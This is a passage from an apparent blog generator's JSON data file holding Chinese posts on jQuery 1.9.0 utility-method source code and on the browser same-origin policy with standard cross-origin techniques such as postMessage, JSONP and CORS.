== true; \narr.indexOf(undefined) == 0; \narr[0] == undefined; \n</code></pre><p>但是如果是以下代码： </p>\n<pre><code>var arr = []; \na[1] = 1; \n</code></pre><p>输出是： </p>\n<pre><code>arr == [undefined, 1] \n0 in arr == false; \narr.indexOf(undefined) == -1; \narr[0] == undefined;\n</code></pre><p>所以<code>(i in arr)</code>也是必要的。</p>\n<h3 id=\"grep\"><a href=\"#grep\" class=\"headerlink\" title=\"$.grep()\"></a>$.grep()</h3><h4 id=\"源码：-4\"><a href=\"#源码：-4\" class=\"headerlink\" title=\"源码：\"></a>源码：</h4><pre><code>grep: function( elems, callback, inv ) {\n    var retVal,\n    ret = [],\n    i = 0,\n    length = elems.length;\n    //转成布尔型\n    inv = !!inv;\n\n    // Go through the array, only saving the items that pass the validator function\n    for ( ; i &lt; length; i++ ) {\n        retVal = !!callback( elems[ i ], i );\n        //注意这里的callback参数是先value,后key\n        if ( inv !== retVal ) {\n            ret.push( elems[ i ] );\n        }\n    }\n\n    return ret;\n}\n</code></pre><p>用例：</p>\n<pre><code>$.grep( [0,1,2], function(n,i){\n  return n &lt;= 0;\n});\n//结果是：[0] \n\n$.grep( [0,1,2], function(n,i){\n  return n &lt;= 0;\n}, true);\n//结果是：[1, 2]\n</code></pre><hr>\n<p>参考链接</p>\n<ul>\n<li><a href=\"https://www.w3ctech.com/topic/256\" target=\"_blank\" rel=\"external\">jQuery源码剖析（一）——概览&amp;工具方法</a></li>\n</ul>\n","site":{"data":{"head":{"Name":"<script> var _hmt = _hmt || []; (function() { var hm = document.createElement('script'); hm.src = 'https://hm.baidu.com/hm.js?348e7e9c1ba7a17f316c54cb6795dec7'; var s = document.getElementsByTagName('script')[0];  s.parentNode.insertBefore(hm, s); })(); </script>"}}},"excerpt":"<blockquote>\n<p>神库jQuery的内心世界</p>\n<p>选用1.9.0版本jQuery</p>\n</blockquote>","more":"<h2 id=\"目录\"><a href=\"#目录\" class=\"headerlink\" title=\"目录\"></a>目录</h2><ol>\n<li><strong>沙箱封装</strong></li>\n<li><strong>core工具方法</strong>：jquery的核心组成部分，包括<ul>\n<li>$.trim()去除字符串两端的空格。（内部调用7次）</li>\n<li>$.each()遍历数组或对象（内部调用59次）</li>\n<li>$.inArray()返回一个值在数组中的索引位置。如果该值不在数组中，则返回-1。（内部调用9次）</li>\n<li>$.grep()返回数组中符合某种标准的元素。（内部调用6次）</li>\n<li>$.merge()合并两个数组。（内部调用11次）</li>\n<li>$.map()将一个数组中的元素转换到另一个数组中。（内部调用12次）</li>\n<li>$.makeArray()将对象转化为数组。（内部调用6次）</li>\n<li>$.globalEval() 在全局作用域下执行一段js脚本。（内部调用2次）</li>\n<li>$.proxy()接受一个函数，然后返回一个新函数，并且这个新函数始终保持了特定的上下文(context)语境。（内部调用0次）</li>\n<li>$.nodeName()返回DOM节点的节点名字，或者判断DOM节点名是否为某某名字。（内部调用51次）</li>\n<li>$.extend()将多个对象，合并到第一个对象。（内部调用42次）</li>\n</ul>\n</li>\n<li><strong>$.type类型判断</strong>：判断对象的类别（函数对象、日期对象、数组对象、正则对象等等（内部调用65次）,并以调用此方法来实现：<ul>\n<li>$.isArray()判断某个参数是否为数组。（内部调用12次）</li>\n<li>$.isEmptyObject()判断某个对象是否为空（不含有任何属性）。（内部调用4次）</li>\n<li>$.isFunction()判断某个参数是否为函数。（内部调用32次）</li>\n<li>$.isPlainObject()判断某个参数是否为用”{}”或”new Object”建立的对象。（内部调用4次）</li>\n<li>$.isWindow()判断是否为window对象。（内部调用6次）</li>\n</ul>\n</li>\n<li><strong>处理ajax返回数据</strong>：主要包括<ul>\n<li>$.parseHTML() 解析HTML（内部调用2次）</li>\n<li>$.parseJSON() 解析JSON（内部调用2次）</li>\n<li>$.parseXML() 解析XML（内部调用1次）</li>\n</ul>\n</li>\n<li><strong>几个简单的函数</strong>：不在之后的文章中分析<ul>\n<li>$.noop() 一个空函数，个人觉得是用来作为一个默认的回调函数，无需每次去定义一个空的function消耗资源。（内部调用2次）</li>\n<li>$.now() 获取当前时间戳，代码很简单：return (new Date()).getTime();。（内部调用4次）</li>\n<li>$.error() 报错，对外抛出一个异常，代码很简单：throw new Error(msg);。（内部调用2次）</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"沙箱封装\"><a href=\"#沙箱封装\" class=\"headerlink\" title=\"沙箱封装\"></a>沙箱封装</h2><pre><code>(function( window, undefined ) {\n     //用一个函数域把整个库包起来，就是所谓的沙箱\n     //在这里边var定义的变量，属于这个函数域内的局部变量，避免污染全局\n     //把当前沙箱需要的外部变量通过函数参数引入进来\n     //只要保证参数对内提供的接口的一致性，你还可以随意替换传进来的这个参数\n    &quot;use strict&quot;;\n    window.jQuery = window.$ = jQuery;\n})( window );\n</code></pre><p>至于为什么第二个参数<code>undefined</code>，这是一个针对压缩的小trick，同时也是为了防止因ES5之前能对<code>undefined</code>赋值而使用者编程不规范引发错误。</p>\n<p>压缩前</p>\n<pre><code>(function( window, undefined ) {\n  var a = undefined;\n  if (a == undefined){......}\n\n  ......\n  if (c == undefined) return;\n})( window );\n</code></pre><p>压缩后</p>\n<pre><code>(function(w, u) {\n  var a = u;\n  if (a == u){......}\n\n  ......\n  if (c == u) return;\n})(w);\n</code></pre><p>内部全局的<code>undefined</code>被缩成一个<code>u</code>，缩小了整个库的压缩包的体积。</p>\n<h2 id=\"core工具方法\"><a href=\"#core工具方法\" class=\"headerlink\" title=\"core工具方法\"></a>core工具方法</h2><h3 id=\"引用类型公有方法的存储\"><a href=\"#引用类型公有方法的存储\" class=\"headerlink\" title=\"引用类型公有方法的存储\"></a>引用类型公有方法的存储</h3><h4 id=\"源码：\"><a href=\"#源码：\" class=\"headerlink\" title=\"源码：\"></a>源码：</h4><pre><code>class2type = {},\ncore_deletedIds = [],\ncore_version = &quot;1.9.0&quot;,\n\n// Save a reference to some core methods\ncore_concat = core_deletedIds.concat,\ncore_push = core_deletedIds.push,\ncore_slice = core_deletedIds.slice,\ncore_indexOf = core_deletedIds.indexOf,\ncore_toString = class2type.toString,\ncore_hasOwn = class2type.hasOwnProperty,\ncore_trim = core_version.trim,\n</code></pre><h4 id=\"等同于：\"><a href=\"#等同于：\" class=\"headerlink\" title=\"等同于：\"></a>等同于：</h4><pre><code>core_concat = Array.prototype.concat, \n......\n</code></pre><h4 id=\"分析：\"><a href=\"#分析：\" class=\"headerlink\" title=\"分析：\"></a>分析：</h4><p>这里把js的几个引用类型的原生方法存储下来。本身这些方法的调用方式就有这3种：</p>\n<pre><code>var arr = [];\n\n1. arr.concat();\n2. core_concat.call(arr);\n3. core_concat.apply(arr);\n</code></pre><p>这里就有两个问题</p>\n<ol>\n<li>jQuery为什么要先把这些方法存储起来？</li>\n<li>jQuery为什么要采用方式二或者三，而不直接使用方式一的做法？ </li>\n</ol>\n<p>其实第二个问题就回答了第一个问题。<br>而关于第二个问题有两个回答：</p>\n<ol>\n<li>按第一种方式调用时，首先需要辨别当前实例<code>arr</code>的类型是<code>Array</code>，在内存空间中寻找<code>Array</code>的<code>concat</code>内存入口，把当前对象<code>arr</code>的指针和其他参数压入栈，跳转到<code>concat</code>地址开始执行。而当保存了<code>concat</code>方法的入口<code>core_concat</code>时，完全就可以省去前面两个步骤，从而提升一些性能。</li>\n<li><code>var obj = {};</code>此时调用<code>obj.concat</code>会报错。但是如果采用后两种方式调用的话，能够解决这个问题。 也即是让类数组也能用到数组的方法（这就是<code>call</code>跟<code>apply</code>带来的另一种用法），尤其在jQuery里边引用一些DOM对象时，也能完美的用这个方法去解决。</li>\n</ol>\n<h3 id=\"trim\"><a href=\"#trim\" class=\"headerlink\" title=\"$.trim()\"></a>$.trim()</h3><h4 id=\"源码：-1\"><a href=\"#源码：-1\" class=\"headerlink\" title=\"源码：\"></a>源码：</h4><pre><code>core_version = &quot;1.9.0&quot;,\ncore_trim = core_version.trim,\nrtrim = /^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g,\n\ntrim: core_trim &amp;&amp; !core_trim.call(&quot;\\uFEFF\\xA0&quot;) ?\n  function( text ) {\n    return text == null ?\n      &quot;&quot; :\n      core_trim.call( text );\n  } :\n\n  // Otherwise use our own trimming functionality\n  function( text ) {\n    return text == null ?\n      &quot;&quot; :\n      ( text + &quot;&quot; ).replace( rtrim, &quot;&quot; );\n  }\n</code></pre><h4 id=\"等同于：-1\"><a href=\"#等同于：-1\" class=\"headerlink\" title=\"等同于：\"></a>等同于：</h4><pre><code>trim: if (String.prototype.trim &amp;&amp; &quot;\\uFEFF\\xA0&quot;.trim() !== &quot;&quot;) {\n    //直接调用原生String的trim方法\n} else {\n    //使用正则表达式和replace方法替换前尾的空格\n}\n</code></pre><h4 id=\"分析：-1\"><a href=\"#分析：-1\" class=\"headerlink\" title=\"分析：\"></a>分析：</h4><p>如果浏览器原生支持<code>String</code>的<code>trim</code>方法，并且能够解析全角空格，那么就直接使用原生的<code>trim</code>方法</p>\n<blockquote>\n<p><code>\\uFEFF</code>是utf8的字节序标记，<code>\\xA0</code>是全角空格</p>\n</blockquote>\n<p>如果以上条件成立，那就直接用原生的trim函数:</p>\n<pre><code>$.trim = function( text ) {\n    return text == null ?\n        &quot;&quot; :\n        text.trim();\n}\n</code></pre><p>如果上述条件不成立，那就自己实现一个<code>trim</code>方法：</p>\n<pre><code>$.trim = function( text ) {\n    return text == null ?\n        &quot;&quot; :\n        ( text + &quot;&quot; ).replace( rtrim, &quot;&quot; );\n}\n</code></pre><h3 id=\"each\"><a href=\"#each\" class=\"headerlink\" title=\"$.each()\"></a>$.each()</h3><h4 id=\"源码：-2\"><a href=\"#源码：-2\" class=\"headerlink\" title=\"源码：\"></a>源码：</h4><pre><code>$.each = function( obj, callback, args ) {\n  //obj 是需要遍历的数组或者对象\n  //callback是处理数组或对象的每个元素的回调函数，它的返回值实际会中断循环的过程\n\n  var value,\n    i = 0,\n    length = obj.length,\n    //判断是不是数组\n    isArray = isArraylike( obj );\n\n  if ( args ) {\n    if ( isArray ) {\n      for ( ; i &lt; length; i++ ) {\n        value = callback.apply( obj[ i ], args );\n        //相当于: args = [arg1, arg2, arg3];\n        //callback(args1, args2, args3)。然后callback里边的this指向了obj[i]\n\n        if ( value === false ) {\n          //注意到，当callback函数返回值会false的时候，注意是全等！循环结束\n          break;\n        }\n      }\n    } else {\n      for ( i in obj ) {\n        value = callback.apply( obj[ i ], args );\n\n        if ( value === false ) {\n          break;\n        }\n      }\n    }\n\n  // A special, fast, case for the most common use of each\n  } else {\n    if ( isArray ) {\n      for ( ; i &lt; length; i++ ) {\n        value = callback.call( obj[ i ], i, obj[ i ] );\n        //相当于callback(i, obj[i])。然后callback里边的this指向了obj[i]\n\n        if ( value === false ) {\n            break;\n          }\n        }\n      } else {\n        for ( i in obj ) {\n          value = callback.call( obj[ i ], i, obj[ i ] );\n\n          if ( value === false ) {\n            break;\n          }\n        }\n      }\n    }\n\n  return obj;\n}\n</code></pre><h4 id=\"等同于：-2\"><a href=\"#等同于：-2\" class=\"headerlink\" title=\"等同于：\"></a>等同于：</h4><pre><code>//for in对于数组来说性能比较低而且存在某些bug\n//这里只是希望用更简洁的代码来减少原先代码的重复性\n$.each = function( obj, callback, args ) {\n  var value,\n    i = 0,\n    length = obj.length;\n\n  for ( i in obj ) {\n    value =\n      args ?\n      callback.apply( obj[ i ], args ) :\n      callback.call( obj[ i ], i, obj[ i ] );\n\n    if ( value === false ) {\n      break;\n    }\n  }\n  return obj;\n}\n</code></pre><h4 id=\"分析：-2\"><a href=\"#分析：-2\" class=\"headerlink\" title=\"分析：\"></a>分析：</h4><p>看这两个例子</p>\n<pre><code>$.each([1,2,3], function(key, value){\n  console.log(&quot;[&quot; + key + &quot;]=&quot; + value);\n  return false;\n});\n//输出：\n[0]=1\n//原数组结果：\n[1,2,3]\n</code></pre><p><code>$.each()</code>接受2个参数， 数组[1,2,3],回调函数<br>可以看到回调函数具有两个参数，<code>key</code>是数组的索引，<code>value</code>是对应的元素</p>\n<pre><code>$.each([1,2,3], function(arg1, arg2){\n  console.log(this + &quot;,&quot; + arg1 + &quot;,&quot; + arg2);\n  return ;\n}, [4, 5]);\n//输出：\n1,4,5\n2,4,5\n3,4,5\n//原数组结果：\n[1,2,3]\n</code></pre><p><code>$.each()</code>接受3个参数， 数组[1,2,3],回调函数，一个额外的参数数组<code>args</code>=[4,5]<br>可以看到回调函数的两个参数就是<code>$.each()</code>的第三个参数<code>args</code>，在函数里边的<code>this</code>就是遍历元素自己</p>\n<p>对比上述二者也可以看到，当回调函数<code>return false</code>后就跳出循环，遍历不再执行</p>\n<h3 id=\"inArray\"><a href=\"#inArray\" class=\"headerlink\" title=\"$.inArray()\"></a>$.inArray()</h3><h4 id=\"源码：-3\"><a href=\"#源码：-3\" class=\"headerlink\" title=\"源码：\"></a>源码：</h4><pre><code>core_deletedIds = [],\ncore_indexOf = core_deletedIds.indexOf,\n\n//elem 规定需检索的值。\n//arr 数组\n//i 可选的整数参数。规定在数组中开始检索的位置。它的合法取值是 0 到 arr.length - 1。如省略该参数，则将从数组首元素开始检索。\ninArray: function( elem, arr, i ) {\n  var len;\n\n  if ( arr ) {\n    //原生的Array对象支持indexOf方法，直接调用\n    if ( core_indexOf ) {\n      return core_indexOf.call( arr, elem, i );\n    }\n\n    len = arr.length;\n    i = i ? i &lt; 0 ? Math.max( 0, len + i ) : i : 0;\n\n    for ( ; i &lt; len; i++ ) {\n      if ( i in arr &amp;&amp; arr[ i ] === elem ) {\n        return i;\n      }\n    }\n  }\n\n  //全部都不符合，返回-1\n  return -1;\n},\n</code></pre><h4 id=\"分析：-3\"><a href=\"#分析：-3\" class=\"headerlink\" title=\"分析：\"></a>分析：</h4><pre><code>i = i ? i &lt; 0 ? Math.max( 0, len + i ) : i : 0;\n</code></pre><p>当i为负数时，从数组后边len+i的位置开始索引</p>\n<pre><code>for ( ; i &lt; len; i++ ) {\n    if ( i in arr &amp;&amp; arr[ i ] === elem ) {\n    return i;\n    }\n}\n</code></pre><p>这里的<code>(i in arr)</code>判断是为了跳过稀疏数组中的元素<br>例如 <code>var arr = []; arr[2] = 1;</code><br>此时 <code>arr == [undefined, undefined, 1]</code><br>结果是 =&gt; </p>\n<ul>\n<li><code>(0 in arr == false)</code> </li>\n<li><code>(1 in arr == false)</code> </li>\n<li><code>(2 in arr == true)</code></li>\n</ul>\n<p>另外（在火狐下）测试得：</p>\n<pre><code>var arr = [undefined, 1]; \n</code></pre><p>输出是： </p>\n<pre><code>arr == [undefined, 1] \n0 in arr == true; \narr.indexOf(undefined) == 0; \narr[0] == undefined; \n</code></pre><p>但是如果是以下代码： </p>\n<pre><code>var arr = []; \na[1] = 1; \n</code></pre><p>输出是： </p>\n<pre><code>arr == [undefined, 1] \n0 in arr == false; \narr.indexOf(undefined) == -1; \narr[0] == undefined;\n</code></pre><p>所以<code>(i in arr)</code>也是必要的。</p>\n<h3 id=\"grep\"><a href=\"#grep\" class=\"headerlink\" title=\"$.grep()\"></a>$.grep()</h3><h4 id=\"源码：-4\"><a href=\"#源码：-4\" class=\"headerlink\" title=\"源码：\"></a>源码：</h4><pre><code>grep: function( elems, callback, inv ) {\n    var retVal,\n    ret = [],\n    i = 0,\n    length = elems.length;\n    //转成布尔型\n    inv = !!inv;\n\n    // Go through the array, only saving the items that pass the validator function\n    for ( ; i &lt; length; i++ ) {\n        retVal = !!callback( elems[ i ], i );\n        //注意这里的callback参数是先value,后key\n        if ( inv !== retVal ) {\n            ret.push( elems[ i ] );\n        }\n    }\n\n    return ret;\n}\n</code></pre><p>用例：</p>\n<pre><code>$.grep( [0,1,2], function(n,i){\n  return n &lt;= 0;\n});\n//结果是：[0] \n\n$.grep( [0,1,2], function(n,i){\n  return n &lt;= 0;\n}, true);\n//结果是：[1, 2]\n</code></pre><hr>\n<p>参考链接</p>\n<ul>\n<li><a href=\"https://www.w3ctech.com/topic/256\">jQuery源码剖析（一）——概览&amp;工具方法</a></li>\n</ul>"},{"title":"js跨域问题","_content":"\n## 同源策略\n\n### 同源包括三个相同\n\n* 协议（protocol）相同\n* 域名（domain/host）相同\n* 端口（port）相同\n\n<!-- more -->\n\n举例来说，对于`http://www.example.com/dir/page.html`这个网址，协议是`http://`，域名是`www.example.com`，端口是`80`（默认端口可以省略）。它的同源情况如下。\n\n* http://www.example.com/dir2/other.html：同源\n* http://example.com/dir/other.html：不同源（域名不同）\n* http://v2.www.example.com/dir/other.html：不同源（域名不同）\n* http://www.example.com:81/dir/other.html：不同源（端口不同）\n\n更多例子：\n\n|URL |说明 |是否允许通信|\n|------|------|------------------|\n|http://www.a.com/a.js<br>http://www.a.com/b.js|同一域名下| 允许|\n|http://www.a.com/lab/a.js<br>http://www.a.com/script/b.js|同一域名下不同文件夹| 允许|\n|http://www.a.com:8000/a.js<br>http://www.a.com/b.js|同一域名，不同端口| 不允许|\n|http://www.a.com/a.js<br>https://www.a.com/b.js|同一域名，不同协议| 不允许|\n|http://www.a.com/a.js<br>http://70.32.92.74/b.js|域名和域名对应ip| 不允许|\n|http://www.a.com/a.js<br>http://script.a.com/b.js|主域相同，子域不同| 不允许|\n|http://www.a.com/a.js<br>http://a.com/b.js|同一域名，不同二级域名（同上）| 不允许（cookie这种情况下也不允许访问）|\n|http://www.cnblogs.com/a.js<br>http://a.com/b.js|不同域名| 不允许|\n\n> 注意\n>\n> 1. 如果是协议和端口造成的跨域问题“前台”是无能为力的，\n> 2. 在跨域问题上，域仅仅是通过“URL的首部”来识别而不会去尝试判断相同的ip地址对应着两个域或两个域是否在同一个ip上。\n>\n> > “URL的首部”指`window.location.protocol` + `window.location.host`，也可以理解为“Domains, protocols and ports must match”。\n\n### 同源策略的目的\n\n为了保证用户信息的安全，防止恶意的网站窃取数据。\n\n### 受限制的行为\n\n* Cookie、LocalStorage 和 IndexDB 无法读取。\n* DOM 无法获得。\n* AJAX 请求不能发送。\n\n## cookie跨域\n\nCookie 是服务器写入浏览器的一小段信息，是储存在用户本地终端上的数据，通常被用来记录访问者的一些信息（尽管这并不安全），只有同源的网页才能共享。\n\n不过这个共享范围比同源稍宽松些。\n\n### 解决办法\n\n如果两个网页一级域名相同，只是二级域名不同，那么浏览器允许通过设置document.domain来共享 Cookie。\n\n例如：\n\n1. 对A,B网页同时设置：`document.domain = 'example.com';`\n2. 在A网页中通过脚本设置一个Cookie：`document.cookie = \"test1=hello\";`\n3. B网页就可以读到这个 Cookie：`var allCookie = document.cookie;`\n\n> 注意：这种方法只适用于 Cookie 和 iframe 窗口（下一节会谈到），LocalStorage 和 IndexDB 无法通过这种方法规避同源政策，而要使用下文介绍的PostMessage API。\n>\n> 另外，服务器也可以在设置Cookie的时候，指定Cookie的所属域名为一级域名，比如为`.example.com`设置`Set-Cookie: key=value; domain=.example.com; path=/`这样的话，二级域名和三级域名不用做任何设置，都可以读取这个Cookie。\n\n## iframe跨域\n\n如果两个网页不同源，就无法拿到对方的DOM。\n典型的例子是`iframe`窗口和`window.open`方法打开的窗口，它们与父窗口无法通信。\n\n比如，父窗口运行下面的命令，如果`iframe`窗口不是同源，就会报错。\n\n\tdocument.getElementById(\"myIFrame\").contentWindow.document\n\t// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.\n\n上面命令中，父窗口想获取子窗口的DOM，因为跨源导致报错。\n反之亦然，子窗口获取主窗口的DOM也会报错。\n\n\twindow.parent.document.body\n\t// 报错\n\n### 解决办法\n\n#### 如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的`document.domain`属性，就可以规避同源策略来访问DOM。\n\n举例如下\n\n在a.html中\n\n\tdocument.domain = 'a.com';\n\tvar ifr = document.createElement('iframe');\n\tifr.src = 'http://script.a.com/b.html';\n\tifr.style.display = 'none';\n\tdocument.body.appendChild(ifr);\n\tifr.onload = function(){\n\t    var doc = ifr.contentDocument || ifr.contentWindow.document;\n\t    // 在这里操纵b.html\n\t    alert(doc.getElementsByTagName(\"h1\")[0].childNodes[0].nodeValue);\n\t};\n\nb.html中\n\n\tdocument.domain = 'a.com';\n\n#### 对于完全不同源的网站，目前有以下几种方法可以解决跨域窗口的通信问题\n\n1. 片段识别符（fragment identifier）\n2. 设置`window.name`\n3. 跨文档通信API（Cross-document messaging）\n\n##### 片段标识符\n\n\n片段标识符（fragment identifier）指的是，URL的#号后面的部分，比如`http://example.com/x.html#fragment的#fragment`。如果只是改变片段标识符，页面不会重新刷新。\n\n父窗口可以把信息，写入子窗口的片段标识符。\n\n\tvar src = originURL + '#' + data;\n\tdocument.getElementById('myIFrame').src = src;\n\n子窗口通过监听`hashchange`事件得到通知。\n\n\twindow.onhashchange = checkMessage;\n\n\tfunction checkMessage() {\n\t  var message = window.location.hash;\n\t  // ...\n\t}\n\n同样的，子窗口也可以改变父窗口的片段标识符。\n\n\tparent.location.href= target + \"#\" + hash;\n\n##### 设置`window.name`\n\n浏览器窗口有`window.name`属性。这个属性的最大特点是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页可以读取它。\n\n有三个页面：\n\n* a.com/app.html：应用页面。\n* a.com/proxy.html：代理文件，一般是一个没有任何内容的html文件，需要和应用页面在同一域下。\n* b.com/data.html：应用页面需要获取数据的页面，可称为数据页面。\n\n过程如下：\n\n1. 在应用页面`（a.com/app.html）`中创建一个`iframe`，把其`src`指向数据页面`（b.com/data.html）`。数据页面`（b.com/data.html）`设置window.name时，由于同源，会自动把数据附加到这个`iframe`的`window.name`上，代码如下：\n\t\t<script type=\"text/javascript\">\n\t    \t\twindow.name = 'I was there!';    //这里是要传输的数据，大小一般为2M，IE和firefox下可以大至32M左右。\n\t\t\t\t\t\t\t\t\t\t\t\t //数据格式可以自定义，如json、字符串\n\t\t</script>\n2. 在应用页面`（a.com/app.html）`中监听`iframe`的`onload`事件，在此事件中设置这个`iframe`的`src`指向本地域的代理文件（代理文件和应用页面在同一域下，所以可以相互通信）。app.html部分代码如下：\n\t\t<script type=\"text/javascript\">\n\t\t    var state = 0, \n\t\t    iframe = document.createElement('iframe'),\n\t\t    loadfn = function() {\n\t\t        if (state === 1) {\n\t\t            var data = iframe.contentWindow.name;    // 读取数据\n\t\t            alert(data);    //弹出'I was there!'\n\t\t        } else if (state === 0) {\n\t\t            state = 1;\n\t\t            iframe.contentWindow.location = \"http://a.com/proxy.html\";    // 设置的代理文件，此时由于iframe的loaction改变，又一次触发load事件\n\t\t        }  \n\t\t    };\n\t\t    iframe.src = 'http://b.com/data.html';\n\t\t    if (iframe.attachEvent) {\n\t\t        iframe.attachEvent('onload', loadfn);\n\t\t    } else {\n\t\t        iframe.onload  = loadfn;\n\t\t    }\n\t\t    document.body.appendChild(iframe);\n\t\t</script>\n3. 获取数据以后销毁这个`iframe`，释放内存；这也保证了安全（不被其他域frame js访问）。\n\t\t<script type=\"text/javascript\">\n\t\t    iframe.contentWindow.document.write('');\n\t\t    iframe.contentWindow.close();\n\t\t    document.body.removeChild(iframe);\n\t\t</script>\n\n总结起来即：iframe的src属性由外域转向本地域，跨域数据即由iframe的window.name从外域传递到本地域。这个就巧妙地绕过了浏览器的跨域访问限制，但同时它又是安全操作。\n\n* 优点: window.name容量很大，可以放置非常长的字符串；\n* 缺点: 必须监听子窗口window.name属性的变化，影响网页性能。\n\n##### 跨文档通信API--postMessage()\n\nHTML5新增一个`window.postMessage`方法，允许跨窗口通信，不论这两个窗口是否同源。并且支持基于web的实时消息传递。\n\n\totherWindow.postMessage(message, targetOrigin);\n\n* `otherWindow`: 对接收信息页面的window的引用。可以是页面中`iframe`的`contentWindow`属性；`window.open`的返回值；通过`name`或下标从`window.frames`取到的值。\n* `message`: 所要发送的数据，string类型。\n* `targetOrigin`: 用于限制otherWindow，即\"协议 + 域名 + 端口\"，`*`表示不限制域名，向所有窗口发送\n\n举例来说，父窗口`http://aaa.com`与子窗口`http://bbb.com`互发消息\n\n父->子\n\n\tvar popup = window.open('http://bbb.com', 'title');\n\tpopup.postMessage('Hello World!', 'http://bbb.com');\n\n子->父\n\n\twindow.opener.postMessage('Nice to see you', 'http://aaa.com');\n\n接受消息：message事件\n\n\twindow.addEventListener('message', function(e) {\n\t  console.log(e.data);\n\t},false);\n\n`message`事件的事件对象`event`，提供以下三个属性。\n\n* event.source：发送消息的窗口\n* event.origin: 消息发向的网址\n* event.data: 消息内容\n\n下面的例子是，子窗口通过`event.source`属性引用父窗口，然后发送消息。\n\n\twindow.addEventListener('message', receiveMessage);\n\tfunction receiveMessage(event) {\n\t  event.source.postMessage('Nice to see you!', '*');\n\t}\n\n`event.origin`属性可以过滤不是发给本窗口的消息。\n\n\twindow.addEventListener('message', receiveMessage);\n\tfunction receiveMessage(event) {\n\t  if (event.origin !== 'http://aaa.com') return;\n\t  if (event.data === 'Hello World') {\n\t      event.source.postMessage('Hello', event.origin);\n\t  } else {\n\t    console.log(event.data);\n\t  }\n\t}\n\n\n## Ajax跨域\n\n同源政策规定，AJAX请求只能发给同源的网址。\n\n除了架设服务器代理（浏览器请求同源服务器，再由后者请求外部服务），有三种方法规避这个限制。\n\n* JSONP\n* WebSocket\n* CORS\n\n### JSONP\n\nJSONP是服务器与客户端跨源通信的常用方法。最大特点就是简单适用，老式浏览器全部支持，服务器改造非常小。\n\n它的基本思想是，网页通过添加一个`<script>`元素，向服务器请求JSON数据，这种做法不受同源政策限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来。\n\n举个例子\n\n\tfunction addScriptTag(src) {\n\t  var script = document.createElement('script');\n\t  script.setAttribute(\"type\",\"text/javascript\");\n\t  script.src = src;\n\t  document.body.appendChild(script);\n\t}\n\t\n\twindow.onload = function () {\n\t  addScriptTag('http://example.com/ip?callback=foo');\n\t}\n\t\n\tfunction foo(data) {\n\t  console.log('Your public IP address is: ' + data.ip);\n\t};\n\n上面代码通过动态添加`<script>`元素，向服务器`example.com`发出请求。\n\n> 注意：该请求的查询字符串有一个`callback`参数（在服务器中须对其进行相关声明和定义），用来指定回调函数的名字，这对于JSONP是必需的。假设目标返回的数据是`[\"customername1\",\"customername2\"]`那么真正返回到客户端的数据为`foo([\"customername1\",\"customername2\"])`\n\n服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。\n\n由于`<script>`元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了`foo`函数，该函数就会立即调用。作为参数的JSON数据被视为JavaScript对象，而不是字符串，因此避免了使用`JSON.parse`的步骤。\n\n### WebSocket跨域\n\nWebSocket是一种通信协议，使用`ws://`（非加密）和`wss://`（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。\n\n下面是一个例子，浏览器发出的WebSocket请求的头信息\n\n\tGET /chat HTTP/1.1\n\tHost: server.example.com\n\tUpgrade: websocket\n\tConnection: Upgrade\n\tSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\n\tSec-WebSocket-Protocol: chat, superchat\n\tSec-WebSocket-Version: 13\n\tOrigin: http://example.com\n\n上面代码中，有一个字段是Origin，表示该请求的请求源（origin），即发自哪个域名。\n\n正是因为有了`Origin`这个字段，所以WebSocket才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。\n\n\tHTTP/1.1 101 Switching Protocols\n\tUpgrade: websocket\n\tConnection: Upgrade\n\tSec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=\n\tSec-WebSocket-Protocol: chat\n\n### CORS跨域\n\n跨源资源分享（Cross-Origin Resource Sharing）\n\n它是W3C标准，是跨源AJAX请求的根本解决方法。\n\n相比JSONP只能发GET请求，CORS允许任何类型的请求。\n\n[CORS跨域详细](http://www.ruanyifeng.com/blog/2016/04/cors.html)\n\n\n****\n\n参考链接\n\n* [浏览器同源政策及其规避方法](http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html)\n* [JavaScript跨域总结与解决办法](http://www.cnblogs.com/rainman/archive/2011/02/20/1959325.html)\n\n","source":"_posts/js跨域问题.md","raw":"---\n\ntitle: js跨域问题\ntags: ['浏览器', 'js']\n\n---\n\n## 同源策略\n\n### 同源包括三个相同\n\n* 协议（protocol）相同\n* 域名（domain/host）相同\n* 端口（port）相同\n\n<!-- more -->\n\n举例来说，对于`http://www.example.com/dir/page.html`这个网址，协议是`http://`，域名是`www.example.com`，端口是`80`（默认端口可以省略）。它的同源情况如下。\n\n* http://www.example.com/dir2/other.html：同源\n* http://example.com/dir/other.html：不同源（域名不同）\n* http://v2.www.example.com/dir/other.html：不同源（域名不同）\n* http://www.example.com:81/dir/other.html：不同源（端口不同）\n\n更多例子：\n\n|URL |说明 |是否允许通信|\n|------|------|------------------|\n|http://www.a.com/a.js<br>http://www.a.com/b.js|同一域名下| 允许|\n|http://www.a.com/lab/a.js<br>http://www.a.com/script/b.js|同一域名下不同文件夹| 允许|\n|http://www.a.com:8000/a.js<br>http://www.a.com/b.js|同一域名，不同端口| 不允许|\n|http://www.a.com/a.js<br>https://www.a.com/b.js|同一域名，不同协议| 不允许|\n|http://www.a.com/a.js<br>http://70.32.92.74/b.js|域名和域名对应ip| 不允许|\n|http://www.a.com/a.js<br>http://script.a.com/b.js|主域相同，子域不同| 不允许|\n|http://www.a.com/a.js<br>http://a.com/b.js|同一域名，不同二级域名（同上）| 不允许（cookie这种情况下也不允许访问）|\n|http://www.cnblogs.com/a.js<br>http://a.com/b.js|不同域名| 不允许|\n\n> 注意\n>\n> 1. 如果是协议和端口造成的跨域问题“前台”是无能为力的，\n> 2. 在跨域问题上，域仅仅是通过“URL的首部”来识别而不会去尝试判断相同的ip地址对应着两个域或两个域是否在同一个ip上。\n>\n> > “URL的首部”指`window.location.protocol` + `window.location.host`，也可以理解为“Domains, protocols and ports must match”。\n\n### 